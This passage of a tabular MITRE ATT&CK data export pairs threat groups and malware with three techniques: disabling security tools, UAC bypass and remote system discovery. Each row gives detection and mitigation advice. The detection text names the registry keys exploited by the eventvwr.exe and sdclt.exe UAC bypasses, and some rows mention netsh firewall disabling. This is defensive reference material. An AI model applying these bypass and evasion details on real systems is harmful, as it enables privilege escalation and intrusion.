'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BACKSPACE, Lecna",['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
296,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Software/S0058|SslMM]] identifies and kills anti-malware processes.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SslMM,['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
297,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Software/S0061|HDoor]] kills anti-virus found on the victim.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HDoor, Custom HDoor",['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
298,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Software/S0108|netsh]] can be used to disable local firewall settings.[[CiteRef::TechNet Netsh Firewall]]'],['Naikon'],['Naikon'],['G0019'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: netsh, netsh.exe",['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
299,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Software/S0108|netsh]] can be used to disable local firewall settings.[[CiteRef::TechNet Netsh Firewall]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: netsh, netsh.exe",['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
300,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['Various [[Group/G0032|Lazarus Group]] malware modifies the Windows firewall to allow incoming connections or disable it entirely using [[Software/S0108|netsh]]. [[CiteRef::Novetta Blockbuster Loaders]] [[CiteRef::Novetta Blockbuster Tools]] [[Group/G0032|Lazarus Group]] malware TangoDelta attempts to terminate various processes associated with McAfee.[[CiteRef::Novetta Blockbuster Tools]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
301,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']","[""[[Software/S0144|ChChes]] can alter the victim's proxy configuration.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]""]",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ChChes, Scorpion, HAYMAKER",['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
302,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Group/G0027|Threat Group-3390]] has used appcmd.exe to disable logging on a victim server.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
303,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']",['[[Software/S0074|Sakula]] contains UAC bypass code for both 32- and 64-bit systems.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: Sakula, Sakurel, VIPER","['Defense Evasion', 'Privilege Escalation']",['Technique/T1088'],['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
304,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']",['[[Software/S0129|AutoIt]] attempts to escalate privileges by bypassing User Access Control.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: AutoIt,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1088'],['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
305,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']","['[[Software/S0148|RTM]] can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.[[CiteRef::ESET RTM Feb 2017]]']",['RTM'],['RTM'],['G0048'],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: RTM,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1088'],['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
306,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']",['[[Software/S0089|BlackEnergy]] attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.[[CiteRef::F-Secure BlackEnergy 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: BlackEnergy, Black Energy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1088'],['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
307,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']",['[[Software/S0154|Cobalt Strike]] can use a number of known techniques to bypass Windows UAC.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Cobalt Strike,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1088'],['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
308,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']",['[[Group/G0016|APT29]] has bypassed UAC.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Privilege Escalation']",['Technique/T1088'],['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
309,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']",['[[Group/G0040|Patchwork]] bypassed User Access Control (UAC).[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Privilege Escalation']",['Technique/T1088'],['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
310,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
311,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['[[Software/S0125|Remsec]] can ping or traceroute a remote host.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
312,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
313,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']",['Commands such as <code>net view</code> can be used in [[Software/S0039|Net]] to gather information about available remote systems.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],"Software: Net, net.exe",['Discovery'],['Technique/T1018'],['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
